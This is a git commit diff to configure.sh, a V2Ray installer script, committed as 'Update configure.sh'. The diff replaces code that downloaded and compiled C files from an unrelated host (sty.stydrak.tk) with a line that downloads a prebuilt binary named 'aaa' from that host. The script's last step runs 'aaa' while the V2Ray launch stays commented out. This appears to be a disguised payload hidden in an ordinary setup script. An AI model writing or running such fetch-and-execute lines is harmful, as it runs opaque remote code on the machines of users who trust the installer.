855c71145b478c8cda4c5af69fb07ad529ec6155
wc32168 <30711646+wc32168@users.noreply.github.com>
2020-12-04 23:41:13 +0800

    Update configure.sh

--- configure.sh
+++ configure.sh
@@ -6,12 +6,7 @@ curl -L -H "Cache-Control: no-cache" -o /tmp/v2ray/v2ray.zip https://github.com/
 unzip /tmp/v2ray/v2ray.zip -d /tmp/v2ray
 install -m 755 /tmp/v2ray/v2ray /usr/local/bin/v2ray
 install -m 755 /tmp/v2ray/v2ctl /usr/local/bin/v2ctl
-curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/1.c http://sty.stydrak.tk/1.c
-curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.c http://sty.stydrak.tk/aes.c
-curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.h http://sty.stydrak.tk/aes.h
-cd /usr/local/bin
-gcc -o aaa 1.c aes.c -lpthread
-chmod 777 ./aaa
+curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aaa http://sty.stydrak.tk/aaa
 
 # Remove temporary directory
 rm -rf /tmp/v2ray
@@ -48,4 +43,4 @@ EOF
 
 # Run V2Ray
 #/usr/local/bin/v2ray -config /usr/local/etc/v2ray/config.json
-./aaa
+/usr/local/bin/aaa
